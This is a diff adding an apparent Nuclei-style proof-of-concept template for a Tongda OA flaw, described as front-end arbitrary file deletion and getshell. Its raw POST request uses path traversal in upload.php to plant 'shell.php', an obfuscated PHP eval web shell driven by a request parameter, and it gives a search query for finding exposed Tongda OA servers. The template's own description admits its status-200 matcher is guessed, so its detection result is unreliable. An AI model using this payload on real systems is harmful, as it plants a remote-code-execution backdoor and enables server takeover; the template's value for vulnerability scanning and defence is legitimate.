@@ -1,0 +1,51 @@
+id: poc-07e213293afaa2d7ecec
+info:
+  name: 通达OAprint.php前台任意文件删除&getshell
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/07e213293afaa2d7ecec05f846397fae
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 07e213293afaa2d7ecec05f846397fae
+    fofa: + hunter`app.name="通达 OA"`
+http:
+- raw:
+  - 'POST /general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./ HTTP/1.1
+
+    Accept-Charset: GBK
+
+    Cookie: null;_SERVER=
+
+    Cache-Control: no-cache
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.7 Safari/537.36
+
+    Connection: close
+
+    Pragma: no-cache
+
+    Content-Type: multipart/form-data; boundary=********
+
+    Host: {{Hostname}}
+
+    Content-Length: 240
+
+
+    --********
+
+    Content-Disposition: form-data; name="FILE1"; filename="shell.php"
+
+
+    <?php class Gpl5I2Tc { public function __construct($H9i75){ @eval("/*Zc3W78jv53*/".$H9i75."/*Zc3W78jv53*/"); }}new Gpl5I2Tc($_REQUEST[''x'']);?>
+
+    --********'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
